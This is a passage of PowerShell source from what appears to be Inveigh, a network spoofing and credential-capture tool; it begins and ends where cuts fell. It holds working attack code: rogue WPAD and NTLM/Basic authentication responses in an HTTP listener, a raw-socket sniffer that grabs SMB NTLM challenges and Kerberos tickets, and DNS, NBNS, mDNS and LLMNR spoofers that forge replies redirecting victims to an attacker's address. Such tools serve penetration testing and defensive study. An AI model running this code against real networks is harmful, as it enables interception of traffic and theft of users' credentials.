                    if($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
                    {
                        $HTTP_message = $WPADResponse
                        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig")
                    }
                    elseif($HTTPResponse)
                    {
                        $HTTP_message = $HTTPResponse
                        
                        if($HTTPContentType)
                        {
                            $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: $HTTPContentType")
                        }

                    }

                    [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
                }

            }
            else
            {
                [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)

            if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
            {

                if($Kerberos -eq 'Y' -and ($KerberosHostHeader.Count -gt 0 -and $KerberosHostHeader -contains $HTTP_header_host))
                {
                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
                }
                else
                {
                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
                }
                
            }
            elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))
            {
                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=$HTTPBasicRealm")
            }
            
            $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary
            $packet_HTTPResponse.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $packet_HTTPResponse.Add("HTTPResponse_StatusCode",$HTTP_response_status_code + [Byte[]](0x20))
            $packet_HTTPResponse.Add("HTTPResponse_ResponsePhrase",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))

            if($HTTP_connection_header_close)
            {
                $HTTP_connection_header = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
                $packet_HTTPResponse.Add("HTTPResponse_Connection",$HTTP_connection_header + [Byte[]](0x0d,0x0a))
            }

            $packet_HTTPResponse.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-Length: $($HTTP_message_bytes.Length)") + [Byte[]](0x0d,0x0a))

            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)
            {
                $packet_HTTPResponse.Add("HTTPResponse_AuthenticateHeader",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_content_type)
            {
                $packet_HTTPResponse.Add("HTTPResponse_ContentType",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_cache_control)
            {
                $packet_HTTPResponse.Add("HTTPResponse_CacheControl",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_send)
            {
                $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
                $HTTP_stream.Flush()
            }

            Start-Sleep -m 10
            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL

            if($HTTP_client_close)
            {
                
                if($proxy_listener)
                {
                    $HTTP_client.Client.Close()
                }
                else
                {
                    $HTTP_client.Close()
                }

            }

        }
        else
        {

            if($HTTP_client_handle_old -eq $HTTP_client.Client.Handle)
            {
                $HTTP_reset++
            }
            else
            {
                $HTTP_reset = 0
            }

            if($HTTP_connection_header_close -or $HTTP_reset -gt 20)
            {
                
                $HTTP_client.Close()
                $HTTP_reset = 0
            }
            else
            {
                Start-Sleep -m 100
            }
            
        }
    
    }

    $HTTP_client.Close()
    $HTTP_listener.Stop()
}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock = 
{
    param ($DNS,$DNSTTL,$EvadeRG,$Inspect,$IP,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$LLMNR,
            $LLMNRTTL,$mDNS,$mDNSTypes,$mDNSTTL,$NBNS,$NBNSTTL,$NBNSTypes,$output_directory,$Pcap,
            $PcapTCP,$PcapUDP,$SMB,$SpooferHostsIgnore,$SpooferHostsReply,$SpooferIP,
            $SpooferIPsIgnore,$SpooferIPsReply,$SpooferLearning,$SpooferLearningDelay,$SpooferLearningInterval,
            $SpooferNonprintable,$SpooferThresholdHost,$SpooferThresholdNetwork)

    $sniffer_running = $true
    $byte_in = New-Object System.Byte[] 4	
    $byte_out = New-Object System.Byte[] 4	
    $byte_data = New-Object System.Byte[] 65534
    $byte_in[0] = 1
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
    $sniffer_socket.ReceiveBufferSize = 65534

    if($Kerberos -eq 'Y')
    {

        if($KerberosHash)
        {
            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join "-"
            $kerberos_base_key = $kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        }
        elseif($KerberosCredential)
        {
            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
        }

    }

    try
    {
        $end_point = New-Object System.Net.IPEndpoint([System.Net.IPAddress]"$IP",0)
    }
    catch
    {
        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting sniffer/spoofer") > $null
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        $sniffer_running = $false
    }

    $sniffer_socket.Bind($end_point)
    $sniffer_socket.IOControl([System.Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)
    $DNS_TTL_bytes = [System.BitConverter]::GetBytes($DNSTTL)
    [Array]::Reverse($DNS_TTL_bytes)
    $LLMNR_TTL_bytes = [System.BitConverter]::GetBytes($LLMNRTTL)
    [Array]::Reverse($LLMNR_TTL_bytes)
    $mDNS_TTL_bytes = [System.BitConverter]::GetBytes($mDNSTTL)
    [Array]::Reverse($mDNS_TTL_bytes)
    $NBNS_TTL_bytes = [System.BitConverter]::GetBytes($NBNSTTL)
    [Array]::Reverse($NBNS_TTL_bytes)
    $LLMNR_learning_log = New-Object System.Collections.Generic.List[string]
    $NBNS_learning_log = New-Object System.Collections.Generic.List[string]

    if($SpooferLearningDelay)
    {    
        $spoofer_learning_delay = New-TimeSpan -Minutes $SpooferLearningDelay
        $spoofer_learning_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }

    [Byte[]]$pcap_header = 0xd4,0xc3,0xb2,0xa1,0x02,0x00,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff +
        0xff,0x00,0x00,0x01,0x00,0x00,0x00

    if($Pcap -eq 'File')
    {
        $pcap_path = $output_directory + "\Inveigh-Packets.pcap"
        $pcap_file_check = [System.IO.File]::Exists($pcap_path)
        
        try
        {
            $pcap_file = New-Object System.IO.FileStream $pcap_path,'Append','Write','Read'

            if(!$pcap_file_check)
            {
                $pcap_file.Write($pcap_header,0,$pcap_header.Count)
            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Disabling pcap output") > $null
            $Pcap = ''
        }

    }
    elseif($Pcap -eq 'Memory' -and !$inveigh.pcap)
    {
        $inveigh.pcap = New-Object System.Collections.ArrayList
        $inveigh.pcap.AddRange($pcap_header)
    }

    while($inveigh.running -and $sniffer_running)
    {
        $packet_length = $sniffer_socket.Receive($byte_data,0,$byte_data.Length,[System.Net.Sockets.SocketFlags]::None)
        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_length)
        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
        $version_HL = $binary_reader.ReadByte()
        $binary_reader.ReadByte() > $null
        $total_length = Convert-DataToUInt16 $binary_reader.ReadBytes(2)
        $binary_reader.ReadBytes(5) > $null
        $protocol_number = $binary_reader.ReadByte()
        $binary_reader.ReadBytes(2) > $null
        $source_IP_bytes = $binary_reader.ReadBytes(4)
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes(4)
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $header_length = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {
            
            6 
            {  # TCP
                $source_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)
                $binary_reader.ReadBytes(8) > $null
                $TCP_header_length = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $TCP_flags = $binary_reader.ReadByte()
                $binary_reader.ReadBytes($TCP_header_length - 14) > $null
                $payload_bytes = $binary_reader.ReadBytes($packet_length)
                $TCP_flags = ([convert]::ToString($TCP_flags,2)).PadLeft(8,"0")

                if($TCP_flags.SubString(6,1) -eq "1" -and $TCP_flags.SubString(3,1) -eq "0" -and $destination_IP -eq $IP)
                {
                    $TCP_session = "$source_IP`:$source_port"
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] TCP($destination_port) SYN packet detected from $TCP_Session") > $null
                }

                switch ($destination_port)
                {

                    139 
                    {

                        if($payload_bytes)
                        {
                            Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "139"
                        }

                        if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
                        {
                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 139 "SMB"
                        }

                    }

                    445
                    {

                        if($kerberos_data.Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
                        {
                            $kerberos_data += $payload_bytes

                            if($kerberos_data.Count -ge $kerberos_length)
                            {
                                New-KerberosKirbi $kerberos_data $kerberos_base_key "SMB" 445 "$source_IP`:$source_port"
                                $kerberos_length = $null
                                $kerberos_data = $null
                                $kerberos_source = $null
                            }

                        }

                        if($payload_bytes)
                        {   
                            $kerberos_connection = Get-SMBConnection $payload_bytes $IP $source_IP $destination_IP $source_port "445"
                            $kerberos_length = $kerberos_connection[0]
                            $kerberos_data = $kerberos_connection[1]
                            $kerberos_source = "$source_IP`:$source_port"
                        }

                        if($inveigh.SMB_session_table.ContainsKey("$source_IP`:$source_port"))
                        {
                            Get-NTLMResponse $payload_bytes $SMB $source_IP $source_port 445 "SMB"
                        }
                    
                    }

                }

                # Outgoing packets
                switch ($source_port)
                {

                    139 
                    {

                        if($payload_bytes)
                        {
                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
                        }

                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
                        {

                            if($source_IP -eq $IP)
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(139) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
                            }

                            $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge
                            $NTLM_challenge = $null
                        }
                    
                    }

                    445
                    {

                        if($payload_bytes)
                        {
                            $NTLM_challenge = Get-SMBNTLMChallenge $payload_bytes
                        }

                        if($NTLM_challenge -and $destination_IP -ne $source_IP)
                        {

                            if($source_IP -eq $IP)
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge sent to $destination_IP`:$destination_port") > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB(445) NTLM challenge $NTLM_challenge received from $destination_IP`:$destination_port") > $null
                            }

                            $inveigh.SMB_session_table."$destination_IP`:$destination_port" = $NTLM_challenge                      
                            $NTLM_challenge = $null
                        }
                        
                    
                    }
                
                }

                if($Pcap -and ($PcapTCP -contains $source_port -or $PcapTCP -contains $destination_port -or $PcapTCP -contains 'All'))
                {

                    if($payload_bytes)
                    {
                        $pcap_epoch_time = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $pcap_length = [System.BitConverter]::GetBytes($packet_length + 14)
                        
                        $pcap_packet = [System.BitConverter]::GetBytes([Int][Math]::Truncate($pcap_epoch_time.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($pcap_epoch_time.Milliseconds) + # should be microseconds but probably doesn't matter
                            $pcap_length +
                            $pcap_length +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $byte_data[0..($packet_length - 1)]

                        if($pcap_packet.Count -eq ($packet_length + 30))
                        {

                            switch ($Pcap)
                            {

                                'File'
                                {

                                    try
                                    {
                                        $pcap_file.Write($pcap_packet,0,$pcap_packet.Count)    
                                    }
                                    catch
                                    {
                                        $error_message = $_.Exception.Message
                                        $error_message = $error_message -replace "`n",""
                                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                    }

                                }

                                'Memory'
                                {
                                    $inveigh.pcap.AddRange($pcap_packet) 
                                }

                            }
                            
                        }

                    }

                }

            }
                
            17 
            {  # UDP
                $source_port = $binary_reader.ReadBytes(2)
                $endpoint_source_port = Convert-DataToUInt16 ($source_port)
                $destination_port = Convert-DataToUInt16 $binary_reader.ReadBytes(2)
                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_uint  = Convert-DataToUInt16 ($UDP_length)
                $binary_reader.ReadBytes(2) > $null
                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_uint - 2) * 4)

                # Incoming packets 
                switch($destination_port)
                {

                    53 # DNS
                    {
                        $DNS_query_string = Get-NameQueryString 12 $payload_bytes
                        $DNS_response_data = $payload_bytes[12..($DNS_query_string.Length + 13)]
                        [Byte[]]$UDP_length = ([System.BitConverter]::GetBytes($DNS_response_data.Count + $DNS_response_data.Count + $SpooferIP.Length + 23))[1,0]
                        $DNS_response_type = "[+]"

                        $DNS_response_data += 0x00,0x01,0x00,0x01 +
                                                $DNS_response_data +
                                                0x00,0x01,0x00,0x01 +
                                                $DNS_TTL_bytes +
                                                0x00,0x04 +
                                                ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
        
                        $DNS_response_packet = 0x00,0x35 +
                                                    $source_port[1,0] +
                                                    $UDP_length +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $DNS_response_data


                        $DNS_response_message = Get-SpooferResponseMessage -QueryString $DNS_query_string -Type "DNS" -Enabled $DNS
                        $DNS_response_type = $DNS_response_message[0]
                        $DNS_response_message = $DNS_response_message[1]

                        if($DNS_response_message -eq '[response sent]')
                        {
                            $DNS_send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                            $DNS_send_socket.SendBufferSize = 1024
                            $DNS_destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port) 
                            $DNS_send_socket.SendTo($DNS_response_packet,$DNS_destination_point) > $null
                            $DNS_send_socket.Close()
                        }

                        if($destination_IP -eq $IP)
                        {
                            $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
                        }
                        else
                        {
                            $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string sent to $destination_IP [outgoing query]") > $null
                        }

                    }

                    137 # NBNS
                    {
                     
                        if(([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -or [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01') -and [System.BitConverter]::ToString($payload_bytes[10..11]) -ne '00-01')
                        {

                            if([System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
                            {
                                $UDP_length[0] += 12
                                $NBNS_response_type = "[+]"
                            
                                $NBNS_response_data = $payload_bytes[13..$payload_bytes.Length] +
                                                        $NBNS_TTL_bytes +
                                                        0x00,0x06,0x00,0x00 +
                                                        ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                    
                                $NBNS_response_packet = 0x00,0x89 +
                                                        $source_port[1,0] +
                                                        $UDP_length[1,0] +
                                                        0x00,0x00 +
                                                        $payload_bytes[0,1] +
                                                        0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                        $NBNS_response_data
                    
                                $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                                $NBNS_query_type = Get-NBNSQueryType $NBNS_query_type
                                $NBNS_type = $payload_bytes[47]
                                $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.Length - 4)])
                                $NBNS_query = $NBNS_query -replace "-00",""
                                $NBNS_query = $NBNS_query.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                                $NBNS_query_string_encoded_check = $NBNS_query_string_encoded
                                $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))                
                                $NBNS_query_string_subtracted = $null
                                $NBNS_query_string = $null
                                $n = 0
                                
                                do
                                {
                                    $NBNS_query_string_sub = (([Byte][Char]($NBNS_query_string_encoded.Substring($n,1))) - 65)
                                    $NBNS_query_string_subtracted += ([System.Convert]::ToString($NBNS_query_string_sub,16))
                                    $n++
                                }
                                until($n -ge ($NBNS_query_string_encoded.Length))
                        
                                $n = 0
                        
                                do
                                {
                                    $NBNS_query_string += ([Char]([System.Convert]::ToInt16($NBNS_query_string_subtracted.Substring($n,2),16)))
                                    $n += 2
                                }
                                until($n -ge ($NBNS_query_string_subtracted.Length) -or $NBNS_query_string.Length -eq 15)

                                if($NBNS_query_string_encoded_check.StartsWith("ABAC") -and $NBNS_query_string_encoded_check.EndsWith("ACAB"))
                                {
                                    $NBNS_query_string = $NBNS_query_string.Substring(2)
                                    $NBNS_query_string = $NBNS_query_string.Substring(0, $NBNS_query_string.Length - 1)
                                    $NBNS_query_string = "<01><02>" + $NBNS_query_string + "<02>"
                                }

                                if($NBNS_query_string -notmatch '[^\x00-\x7F]+')
                                {

                                    if(!$inveigh.request_table.ContainsKey($NBNS_query_string))
                                    {
                                        $inveigh.request_table.Add($NBNS_query_string.ToLower(),[Array]$source_IP.IPAddressToString)
                                        $inveigh.request_table_updated = $true
                                    }
                                    else
                                    {
                                        $inveigh.request_table.$NBNS_query_string += $source_IP.IPAddressToString
                                        $inveigh.request_table_updated = $true
                                    }

                                }

                                $NBNS_request_ignore = $false
                            }

                            if($SpooferLearning -eq 'Y' -and $inveigh.valid_host_list -notcontains $NBNS_query_string -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00' -and $source_IP -ne $IP)
                            {
                            
                                if(($NBNS_learning_log.Exists({param($s) $s -like "20* $NBNS_query_string"})))
                                {
                                    $NBNS_learning_queue_time = [DateTime]$NBNS_learning_log.Find({param($s) $s -like "20* $NBNS_query_string"}).SubString(0,19)

                                    if((Get-Date) -ge $NBNS_learning_queue_time.AddMinutes($SpooferLearningInterval))
                                    {
                                        $NBNS_learning_log.RemoveAt($NBNS_learning_log.FindIndex({param($s) $s -like "20* $NBNS_query_string"}))
                                        $NBNS_learning_send = $true
                                    }
                                    else
                                    {
                                        $NBNS_learning_send = $false
                                    }

                                }
                                else
                                {           
                                    $NBNS_learning_send = $true
                                }

                                if($NBNS_learning_send)
                                {
                                    $NBNS_transaction_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
                                    $NBNS_transaction_ID_bytes = $NBNS_transaction_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $NBNS_transaction_ID = $NBNS_transaction_ID -replace " ","-"
                                    $NBNS_UDP_client = New-Object System.Net.Sockets.UdpClient 137
                                    $NBNS_hostname_bytes = $payload_bytes[13..($payload_bytes.Length - 5)]

                                    $NBNS_request_packet = $NBNS_transaction_ID_bytes +
                                                            0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                            $NBNS_hostname_bytes +
                                                            0x00,0x20,0x00,0x01

                                    $NBNS_learning_destination_endpoint = New-Object System.Net.IPEndpoint([IPAddress]::broadcast,137)
                                    $NBNS_UDP_client.Connect($NBNS_learning_destination_endpoint)
                                    $NBNS_UDP_client.Send($NBNS_request_packet,$NBNS_request_packet.Length)
                                    $NBNS_UDP_client.Close()
                                    $NBNS_learning_log.Add("$(Get-Date -format s) $NBNS_transaction_ID $NBNS_query_string") > $null
                                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] NBNS request $NBNS_query_string sent to " + $NBNS_learning_destination_endpoint.Address.IPAddressToString) > $null
                                }

                            }

                            $NBNS_response_message = Get-SpooferResponseMessage -QueryString $NBNS_query_string -Type "NBNS" -Enabled $NBNS -NBNSType $NBNS_type
                            $NBNS_response_type = $NBNS_response_message[0]
                            $NBNS_response_message = $NBNS_response_message[1]

                            if($NBNS_response_message -eq '[response sent]')
                            {

                                if($SpooferLearning -eq 'N' -or !$NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                {
                                    $NBNS_send_socket = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $NBNS_send_socket.SendBufferSize = 1024
                                    $NBNS_destination_point = New-Object Net.IPEndpoint($source_IP,$endpoint_source_port)
                                    $NBNS_send_socket.SendTo($NBNS_response_packet,$NBNS_destination_point) > $null
                                    $NBNS_send_socket.Close()
                                }
                                else
                                {
                                    $NBNS_request_ignore = $true
                                }
                                
                            }
                            else
                            {
                                
                                if($source_IP -eq $IP -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                                {
                                    $NBNS_request_ignore = $true
                                }
                                
                            }

                            if(!$NBNS_request_ignore -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-01-00-00')
                            {
                                $inveigh.output_queue.Add("$NBNS_response_type [$(Get-Date -format s)] NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message") > $null
                            }
                            elseif($SpooferLearning -eq 'Y' -and [System.BitConverter]::ToString($payload_bytes[4..7]) -eq '00-00-00-01' -and $NBNS_learning_log.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($payload_bytes[0..1]) + " *"}))
                            {
                                [Byte[]]$NBNS_response_IP_bytes = $payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length)]
                                $NBNS_response_IP = [System.Net.IPAddress]$NBNS_response_IP_bytes
                                $NBNS_response_IP = $NBNS_response_IP.IPAddressToString

                                if($inveigh.valid_host_list -notcontains $NBNS_query_string)
                                {
                                    $inveigh.valid_host_list.Add($NBNS_query_string) > $null
                                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $NBNS_response_IP for $NBNS_query_string received from $source_IP [added to valid host list]") > $null
                                }

                            }

                        }

                    }

                    5353 # mDNS
                    {   
                        
                        if(([System.BitConverter]::ToString($payload_bytes)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($payload_bytes[4..11]) -eq "00-01-00-00-00-00-00-00")
                        {
                            $UDP_length[0] += 10
                            $mDNS_query_string_full = Get-NameQueryString 12 $payload_bytes
                            $mDNS_query_payload_bytes = $payload_bytes[12..($mDNS_query_string_full.Length + 13)]
                            $mDNS_query_string = ($mDNS_query_string_full.Split("."))[0]
                            $UDP_length[0] = $mDNS_query_payload_bytes.Count + $SpooferIP.Length + 23
                            $mDNS_response_type = "[+]"

                            $mDNS_response_data = $mDNS_query_payload_bytes +
                                                    0x00,0x01,0x00,0x01 +
                                                    $mDNS_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
                        
                            $mDNS_response_packet = 0x14,0xe9 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $mDNS_response_data
                            

                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QU" -Enabled $mDNS
                            $mDNS_response_type = $mDNS_response_message[0]
                            $mDNS_response_message = $mDNS_response_message[1]
                            
                            if($mDNS_response_message -eq '[response sent]')
                            {
                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                $send_socket.SendBufferSize = 1024
                                $destination_point = New-Object System.Net.IPEndpoint($source_IP,$endpoint_source_port)
                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
                                $send_socket.Close()
                            }

                            $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QU) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
                        }
                        elseif(([System.BitConverter]::ToString($payload_bytes)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
                            $payload_bytes[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($payload_bytes[4..11]) -eq "00-02-00-00-00-00-00-00"))
                        {
                            $mDNS_query_string_full = Get-NameQueryString 12 $payload_bytes
                            $mDNS_query_payload_bytes = $payload_bytes[12..($mDNS_query_string_full.Length + 13)]
                            $mDNS_query_string = ($mDNS_query_string_full.Split("."))[0]
                            $UDP_length[0] = $mDNS_query_payload_bytes.Count + $SpooferIP.Length + 23
                            $mDNS_response_type = "[+]"

                            $mDNS_response_data = $mDNS_query_payload_bytes +
                                                    0x00,0x01,0x80,0x01 +
                                                    $mDNS_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()

                        
                            $mDNS_response_packet = 0x14,0xe9 +
                                                    $source_port[1,0] +
                                                    $UDP_length[1,0] +
                                                    0x00,0x00 +
                                                    $payload_bytes[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $mDNS_response_data
                   
                            $mDNS_response_message = Get-SpooferResponseMessage -QueryString $mDNS_query_string  -Type "mDNS" -mDNSType "QM" -Enabled $mDNS
                            $mDNS_response_type = $mDNS_response_message[0]
                            $mDNS_response_message = $mDNS_response_message[1]
                            
                            if($mDNS_response_message -eq '[response sent]')
                            {
                                $send_socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                $send_socket.SendBufferSize = 1024
                                $destination_point = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                                $send_socket.SendTo($mDNS_response_packet,$destination_point) > $null
                                $send_socket.Close()
                            }

                            $inveigh.output_queue.Add("$mDNS_response_type [$(Get-Date -format s)] mDNS(QM) request $mDNS_query_string_full received from $source_IP $mDNS_response_message") > $null
                        }
                        
                    }

                    5355 # LLMNR
                    {

                        if([System.BitConverter]::ToString($payload_bytes[($payload_bytes.Length - 4)..($payload_bytes.Length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            $UDP_length[0] += $payload_bytes.Length - 2
                            $LLMNR_response_data = $payload_bytes[12..$payload_bytes.Length]
                            $LLMNR_response_type = "[+]"

                            $LLMNR_response_data += $LLMNR_response_data +
                                                    $LLMNR_TTL_bytes +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$SpooferIP)).GetAddressBytes()
            
                            $LLMNR_response_packet = 0x14,0xeb +
                                                        $source_port[1,0] +
                                                        $UDP_length[1,0] +
                                                        0x00,0x00 +
                                                        $payload_bytes[0,1] +
